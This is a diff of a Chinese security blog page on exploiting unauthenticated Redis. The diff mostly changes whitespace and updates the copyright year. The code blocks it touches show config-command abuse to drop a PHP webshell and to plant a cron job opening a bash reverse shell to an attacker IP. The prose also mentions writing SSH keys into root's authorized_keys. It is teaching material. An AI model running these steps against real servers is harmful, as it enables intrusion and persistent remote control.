@@ -521,19 +521,19 @@ protected-mode no<span aria-hidden="true" class="line-numbers-rows"><span></span
 info <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <h3 id="2-2、利用实例："><a href="#2-2、利用实例：" class="headerlink" title="2.2、利用实例："></a>2.2、<strong>利用实例：</strong></h3><p> <strong>Redis</strong> 自身的提供的 <strong>config</strong> 命令，可以进行<strong>写文件操作</strong></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1、Webshell写入													#前提知道web路径				</span>
-config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/tmp										<span class="token comment">#设置WEB写入目录，目录需有可读写权限</span>
-config <span class="token builtin class-name">set</span> dbfilename test.php						<span class="token comment">#设置写入文件名</span>
-<span class="token builtin class-name">set</span> <span class="token builtin class-name">test</span> <span class="token string">"&lt;?php phpinfo();?>"</span>							<span class="token comment">#设置写入文件代码</span>
-save																			<span class="token comment">#保存执行 或者使用 bgsave</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1、Webshell写入									#前提知道web路径				</span>
+config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/tmp						<span class="token comment">#设置WEB写入目录，目录需有可读写权限</span>
+config <span class="token builtin class-name">set</span> dbfilename test.php		<span class="token comment">#设置写入文件名</span>
+<span class="token builtin class-name">set</span> <span class="token builtin class-name">test</span> <span class="token string">"&lt;?php phpinfo();?>"</span>			<span class="token comment">#设置写入文件代码</span>
+save															<span class="token comment">#保存执行 或者使用 bgsave</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 2、计划任务反弹shell			</span>
-config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/crontabs																			<span class="token comment">#设置写入计划任务目录</span>
-config <span class="token builtin class-name">set</span> dbfilename xxx																										<span class="token comment">#设置写入文件名</span>
+config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/crontabs												<span class="token comment">#设置写入计划任务目录</span>
+config <span class="token builtin class-name">set</span> dbfilename xxx																			<span class="token comment">#设置写入文件名</span>
 <span class="token builtin class-name">set</span> xx <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * bash -i >$ /dev/tcp/120.55.xx.xx/3333 0>&amp;1<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>		<span class="token comment">#设置写入文件代码,在120.55.xx.xx监听</span>
-save																																				<span class="token comment">#保存执行 或者使用 bgsave</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+save																													<span class="token comment">#保存执行 或者使用 bgsave</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>攻击者可成功将自己的 ssh 公钥写入目标服务器的<code>／root /. ssh </code>文件夹的 <code>authotrized keys</code> 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器器、添加计划任务、写入Webshell等操作。 </p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 3、写入Linux ssh-key公钥</span>
@@ -1398,7 +1398,7 @@ JDBC URL：rmi:&#x2F;&#x2F;120.55.xx.xx:1099&#x2F;kd1rns<span aria-hidden="true"
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2019-2023</span>
             
             <a href="/about" target="_blank">BaiJi</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
